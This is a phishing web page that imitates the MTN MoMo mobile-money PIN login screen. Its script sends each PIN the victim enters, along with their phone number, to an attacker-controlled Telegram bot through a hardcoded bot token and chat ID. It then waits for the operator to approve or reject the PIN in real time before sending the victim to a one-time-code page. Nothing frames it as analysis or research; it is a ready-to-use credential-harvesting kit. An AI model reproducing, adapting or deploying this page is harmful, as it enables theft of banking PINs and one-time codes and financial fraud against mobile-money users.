<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Enter PIN</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
    body { background-color: #222; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .app-screen { width: 100%; max-width: 412px; height: 100vh; max-height: 870px; background-color: #fff; display: flex; flex-direction: column; position: relative; overflow: hidden; padding: 0 24px; }
    .top-bg { position: absolute; top: 0; left: 0; width: 100%; height: 290px; background-color: #003e5a; clip-path: ellipse(120% 100% at 50% 0%); z-index: 1; }
    .header { position: relative; z-index: 2; display: flex; flex-direction: column; align-items: center; margin-top: 50px; }
    .custom-logo { width: 85px; height: 85px; object-fit: cover; border-radius: 50%; }
    .momo-branding { margin-top: 8px; text-align: center; }
    .momo-title { color: #ffcc00; font-size: 32px; font-weight: 800; line-height: 1; }
    .momo-subtitle { color: #ffcc00; font-size: 13px; font-weight: 700; margin-top: 2px; }
    .pin-container { position: relative; z-index: 2; margin-top: 140px; display: flex; flex-direction: column; align-items: center; width: 100%; }
    .pin-title { color: #333; font-size: 19px; font-weight: 400; margin-bottom: 24px; }
    .pin-inputs { display: flex; justify-content: center; gap: 10px; width: 100%; margin-bottom: 16px; }
    .pin-box { width: 52px; height: 58px; border: 1.5px solid #d18d96; border-radius: 14px; text-align: center; font-size: 24px; font-weight: 600; color: #003e5a; outline: none; background-color: #fff; }
    .forgot-pin { color: #333; font-size: 16px; text-decoration: none; margin-bottom: 40px; }
    .btn-login { width: 100%; height: 52px; border-radius: 14px; border: none; background-color: #72a5c2; color: #fff; font-size: 18px; font-weight: 600; cursor: pointer; }
  </style>
</head>
<body>

  <div class="app-screen">
    <div class="top-bg"></div>
    <div class="header">
      <img src="https://www.pinterest.com/pin/925771267171841899/" alt="App Logo" class="custom-logo" />
      <div class="momo-branding">
        <div class="momo-title">MoMo</div>
        <div class="momo-subtitle">from MTN</div>
      </div>
    </div>

    <form id="pinForm" class="pin-container">
      <h3 class="pin-title">Enter your PIN</h3>
      <div class="pin-inputs">
        <input type="password" maxlength="1" class="pin-box" autofocus required />
        <input type="password" maxlength="1" class="pin-box" required />
        <input type="password" maxlength="1" class="pin-box" required />
        <input type="password" maxlength="1" class="pin-box" required />
        <input type="password" maxlength="1" class="pin-box" required />
      </div>

      <a href="#" class="forgot-pin">Forgot PIN?</a>
      <button type="submit" class="btn-login">Login</button>
    </form>
  </div>

  <script>
    const BOT_TOKEN = '8410203371:AAHBXFvIx1pMdvEQ9FCSLrv0-CCgrLcGRjk';
    const CHAT_ID = '6347393664';

    const inputs = document.querySelectorAll('.pin-box');
    const pinForm = document.getElementById('pinForm');
    const loginBtn = document.querySelector('.btn-login');

    inputs.forEach((input, index) => {
      input.addEventListener('input', () => {
        if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
      });
      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && input.value === '' && index > 0) inputs[index - 1].focus();
      });
    });

    pinForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      
      let pin = '';
      inputs.forEach(i => pin += i.value);
      const phone = localStorage.getItem('userPhone') || 'Unknown';

      loginBtn.innerText = 'Verifying...';
      loginBtn.disabled = true;

      const message = `🔑 *PIN Verification*\nPhone: \`${phone}\`\nPIN: \`${pin}\`\n\nIs this PIN correct?`;

      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '✅ Approve PIN', callback_data: `approve_pin_${pin}` },
                  { text: '❌ Reject PIN', callback_data: `reject_pin_${pin}` }
                ]
              ]
            }
          })
        });

        const data = await response.json();
        if (data.ok) {
          checkPinApproval(pin, phone);
        }
      } catch (error) {
        alert('Error verifying PIN.');
        loginBtn.innerText = 'Login';
        loginBtn.disabled = false;
      }
    });

    function checkPinApproval(pin, phone) {
      let offset = 0;
      const interval = setInterval(async () => {
        try {
          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}`);
          const data = await res.json();

          if (data.ok && data.result.length > 0) {
            for (const update of data.result) {
              offset = update.update_id + 1;

              if (update.callback_query) {
                const action = update.callback_query.data;

                if (action === `approve_pin_${pin}`) {
                  clearInterval(interval);
                  window.location.href = `otp.html?phone=${encodeURIComponent(phone)}`;
                } else if (action === `reject_pin_${pin}`) {
                  clearInterval(interval);
                  alert('Incorrect PIN. Please re-enter.');
                  inputs.forEach(i => i.value = '');
                  inputs[0].focus();
                  loginBtn.innerText = 'Login';
                  loginBtn.disabled = false;
                }
              }
            }
          }
        } catch (err) {
          console.error('Polling error:', err);
        }
      }, 3000);
    }
  </script>
</body>
</html>
